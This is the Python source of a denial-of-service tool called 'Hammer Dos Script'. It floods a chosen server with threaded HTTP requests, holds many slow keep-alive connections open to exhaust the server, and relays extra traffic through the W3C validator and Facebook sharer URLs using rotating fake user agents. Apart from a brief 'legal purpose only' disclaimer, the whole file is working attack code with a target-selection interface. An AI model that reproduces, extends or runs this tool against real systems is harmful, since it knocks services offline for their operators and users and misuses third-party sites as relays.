#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ Hammer Dos Script v.1
# by Can Yalçın
# only for legal purpose


from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def bot_hammering(url):
	while True:
		try:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94mbot is hammering...\033[0m")
			time.sleep(.1)
		except:
			time.sleep(.1)


#persistent connection pool
hold_sockets = []
hold_lock = threading.Lock()

def init_hold_socket():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(4)
	s.connect((host,int(port)))
	s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('utf-8'))
	s.send("User-Agent: {}\r\n".format(random.choice(uagent)).encode('utf-8'))
	s.send("Accept-language: en-US,en,q=0.5\r\n".encode('utf-8'))
	return s


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mno connection! server maybe down\033[0m")
		time.sleep(.1)


def hold_connections():
	while True:
		with hold_lock:
			#keep-alive on active sockets
			for s in list(hold_sockets):
				try:
					s.send("X-a: {}\r\n".format(random.randint(1,5000)).encode('utf-8'))
				except socket.error:
					hold_sockets.remove(s)
			#replace dead sockets
			diff = thr - len(hold_sockets)
			if diff > 0:
				for _ in range(diff):
					try:
						s = init_hold_socket()
						hold_sockets.append(s)
					except socket.error:
						break
		print("\033[93mhold:",len(hold_sockets),"active\033[0m")
		time.sleep(15)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m	Hammer Dos Script v.1 https://cyweb.github.io/hammer/
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 hammer.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
	-t : turbo default 135 \033[0m''')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94mPlease wait...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.close()
	except socket.error as e:
		print("\033[91mcheck server ip and port\033[0m")
		usage()
	#init persistent socket pool
	for _ in range(int(thr)):
		try:
			s = init_hold_socket()
			hold_sockets.append(s)
		except socket.error:
			break
	print("\033[93mhold:",len(hold_sockets),"sockets\033[0m")
	ts = threading.Thread(target=hold_connections)
	ts.daemon = True
	ts.start()
	#worker threads capped at 200 to avoid OS limit
	workers = min(int(thr), 200)
	for i in range(workers):
		t = threading.Thread(target=dos)
		t.daemon = True
		t.start()
		t2 = threading.Thread(target=dos2)
		t2.daemon = True
		t2.start()
	item = 0
	while True:
		if (item>1800):
			item=0
			time.sleep(.1)
		item = item + 1
		q.put(item)
		w.put(item)
